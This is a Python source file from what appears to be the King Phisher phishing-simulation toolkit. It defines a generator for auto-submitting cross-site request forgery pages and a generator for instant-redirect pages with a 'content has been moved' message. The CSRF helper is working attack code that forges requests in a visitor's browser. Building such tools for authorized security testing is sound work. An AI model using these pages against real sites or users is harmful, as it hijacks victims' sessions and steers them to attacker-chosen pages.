#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
#  king_phisher/server/pages.py
#
#  Redistribution and use in source and binary forms, with or without
#  modification, are permitted provided that the following conditions are
#  met:
#
#  * Redistributions of source code must retain the above copyright
#    notice, this list of conditions and the following disclaimer.
#  * Redistributions in binary form must reproduce the above
#    copyright notice, this list of conditions and the following disclaimer
#    in the documentation and/or other materials provided with the
#    distribution.
#  * Neither the name of the project nor the names of its
#    contributors may be used to endorse or promote products derived from
#    this software without specific prior written permission.
#
#  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
#  "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
#  LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
#  A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
#  OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,
#  SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT
#  LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
#  DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
#  THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
#  (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
#  OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
#

import sys

import markupsafe

from king_phisher import utilities

if sys.version_info[0] < 3:
	import cgi as html
else:
	import html

def make_csrf_page(url, params, method='POST'):
	"""
	A Jinja function which will create an HTML page that will automatically
	perform a CSRF attack against another page.

	:param str url: The URL to use as the form action.
	:param dict params: The parameters to send in the forged request.
	:param str method: The HTTP method to use when submitting the form.
	"""
	escape = lambda s: html.escape(s, quote=True)
	form_id = utilities.random_string(12)

	page = []
	page.append('<!DOCTYPE html>')
	page.append('<html lang="en-US">')
	page.append("  <body onload=\"document.getElementById(\'{0}\').submit()\">".format(form_id))
	page.append("    <form id=\"{0}\" action=\"{1}\" method=\"{2}\">".format(form_id, escape(url), escape(method)))
	for key, value in params.items():
		page.append("      <input type=\"hidden\" name=\"{0}\" value=\"{1}\" />".format(escape(key), escape(value)))
	page.append('    </form>')
	page.append('  </body>')
	page.append('</html>')

	page = '\n'.join(page)
	return markupsafe.Markup(page)

def make_redirect_page(url, title='Automatic Redirect'):
	"""
	A Jinja function which will create an HTML page that will automatically
	redirect the viewer to a different url.

	:param str url: The URL to redirect the user to.
	:param str title: The title to use in the resulting HTML page.
	"""
	title = html.escape(title, quote=True)
	url = html.escape(url, quote=True)

	page = []
	page.append('<!DOCTYPE html>')
	page.append('<html lang="en-US">')
	page.append('  <head>')
	page.append("    <title>{0}</title>".format(title))
	page.append("    <meta http-equiv=\"refresh\" content=\"0;url={0}\" />".format(url))
	page.append('  </head>')
	page.append('  <body>')
	page.append("    <p>The content you are looking for has been moved. If you are not redirected automatically then <a href=\"{0}\">click here</a> to proceed.</p>".format(url))
	page.append('  </body>')
	page.append('</html>')

	page = '\n'.join(page)
	return markupsafe.Markup(page)
